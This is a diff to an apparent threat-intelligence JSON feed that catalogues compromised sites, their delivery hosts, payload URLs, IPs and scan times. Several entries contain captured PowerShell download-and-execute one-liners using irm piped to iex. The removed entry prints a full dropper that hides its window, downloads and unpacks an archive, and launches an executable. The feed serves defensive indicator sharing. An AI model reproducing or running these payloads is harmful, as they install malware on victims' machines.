@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "hackandslashgames.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
+    ],
+    "IP": [
+      "162.159.135.42"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
+    ],
+    "ReportId": "cmwooi70420ts0omlj0pbm2lo",
+    "ScannedAt": "2026-11-20T07:49:52.529000+00:00"
+  },
+  {
+    "UrlDomain": "liajoffe.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
+    ],
+    "IP": [
+      "162.241.144.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/38ade94b3e931d9d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
+    ],
+    "ReportId": "cmwooi4ba20ti0omludc2kosv",
+    "ScannedAt": "2026-11-20T07:49:49.061000+00:00"
+  },
+  {
     "UrlDomain": "www.moebelfan.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -6337,24 +6375,5 @@
     ],
     "ReportId": "cmwkj68iz1ep40omlm1jzy3cm",
     "ScannedAt": "2026-11-17T10:09:31.888000+00:00"
-  },
-  {
-    "UrlDomain": "superbbicycle.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.53.227"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwkdyqkq1ejj0omlch1vgqva",
-    "ScannedAt": "2026-11-17T07:43:43.957000+00:00"
   }
 ]
